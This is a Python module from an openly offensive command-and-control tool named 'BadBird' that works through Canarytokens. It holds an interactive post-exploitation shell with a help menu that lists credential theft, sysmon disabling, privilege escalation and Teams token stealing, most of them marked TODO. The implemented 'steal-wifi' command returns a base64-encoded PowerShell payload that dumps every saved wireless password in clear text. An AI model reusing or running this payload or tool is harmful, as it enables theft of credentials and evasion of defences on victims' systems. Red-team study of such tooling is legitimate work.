# BadBird C2 Through Canarytokens
# Author: Austin Martin @amartinsec/blog.amartinsec.com
from colorama import Fore



#!/usr/bin/env python3

def postExpWelcome():
    #More ASCII
    # fire ascii from https://ascii.co.uk/art/fire
    print(Fore.RED)
    print("                           (  .      )        ( ")
    print("         .-.            )           (           )   )")
    print("        (  '>                 .  '   .   '  .  '  . ")
    print("        /  \\        (    , )       (.   )  (   ',    )")
    print("       /  \ |         .' ) ( . )    ,  ( ,     )   ( .")
    print("      / ,_//       ). , ( .   (  ) ( , ')  .' (  ,    ) " )
    print(Fore.WHITE + "~~~~~" + Fore.RED + "//'--'" + Fore.WHITE + "~~~~~~~" + Fore.RED + "(_,) . ), ) _) _,')  (, ) '. )  ,. (' )" + Fore.WHITE + "~~~~")
    print("~~~~" + Fore.RED + "//" + Fore.WHITE + "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print("~~~" + Fore.RED + "//" + Fore.WHITE + "~~~~~~~~~~~~~~~~~~~~~ " + Fore.RESET + "Post-exp Shell " + Fore.WHITE + "~~~~~~~~~~~~~~~~~~~~~")

    print(Fore.RESET + "\nType `help` for a list of post-exploitation commands\n")


def postExpHelp():
    print(Fore.GREEN + "[+]" + Fore.RESET + " Post Exploitation Shell:\n")
    print("   `Back` or `Exit`:\tReturns to the main menu".expandtabs(40))
    print("   Help:\tPrints this menu".expandtabs(40))
    print("   Steal-wifi:\tGrabs all saved wireless credentials".expandtabs(40))
    print("   Getprivs:\tGrabs the current user's privileges(TODO)".expandtabs(40))
    print("   Getuid:\tReturns the current user's UID with the current token(TODO)".expandtabs(40))
    print("   Killproc:\tKills a process by PID(TODO)".expandtabs(40))
    print("   Sysmon-kill:\tStops sysmon(TODO)".expandtabs(40))
    print("   Byod:\tAttempts to elevate to SYSTEM by using the BYOD (Bring-your-own-driver) method(TODO)".expandtabs(40))
    print("   Cursed-chrome:\tCursed Chrome implementation(TODO)".expandtabs(40))
    print("   Team-thief <`cookies`/`snoop`>:\tSteal the user's MS Teams session token or grabs cached conversations(TODO)".expandtabs(40))
    print("   Reg stuff:\tFun post-exp registry stuff here(TODO)\n".expandtabs(40))


def postExpShell():
    postExpWelcome()
    while True:
        user_input = input(Fore.GREEN + "Post-Exp>> " + Fore.RESET)
        if user_input.lower() == "back" or user_input.lower() == "exit":
            print(Fore.RESET + "Returning to main menu...\n")
            return ""
        elif user_input.lower() == "help":
            postExpHelp()

        elif user_input.lower() == "steal-wifi":
            return 'powershell.exe -e KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBvAGYAaQBsAGUAcwApACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAiAFwAOgAoAC4AKwApACQAIgAgAHwAIAAlAHsAJABuAGEAbQBlAD0AJABfAC4ATQBhAHQAYwBoAGUAcwAuAEcAcgBvAHUAcABzAFsAMQBdAC4AVgBhAGwAdQBlAC4AVAByAGkAbQAoACkAOwAgACQAXwB9ACAAfAAgACUAewAoAG4AZQB0AHMAaAAgAHcAbABhAG4AIABzAGgAbwB3ACAAcAByAG8AZgBpAGwAZQAgAG4AYQBtAGUAPQAiACQAbgBhAG0AZQAiACAAawBlAHkAPQBjAGwAZQBhAHIAKQB9ACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAiAEsAZQB5ACAAQwBvAG4AdABlAG4AdABcAFcAKwBcADoAKAAuACsAKQAkACIAIAB8ACAAJQB7ACQAcABhAHMAcwA9ACQAXwAuAE0AYQB0AGMAaABlAHMALgBHAHIAbwB1AHAAcwBbADEAXQAuAFYAYQBsAHUAZQAuAFQAcgBpAG0AKAApADsAIAAkAF8AfQAgAHwAIAAlAHsAWwBQAFMAQwB1AHMAdABvAG0ATwBiAGoAZQBjAHQAXQBAAHsAIABQAFIATwBGAEkATABFAF8ATgBBAE0ARQA9ACQAbgBhAG0AZQA7AFAAQQBTAFMAVwBPAFIARAA9ACQAcABhAHMAcwAgAH0AfQAgAHwAIABGAG8AcgBtAGEAdAAtAFQAYQBiAGwAZQAgAC0AQQB1AHQAbwBTAGkAegBlAA=='
        else:
            print(Fore.RED + "[-]" + Fore.RESET + " Unknown command: " + user_input)

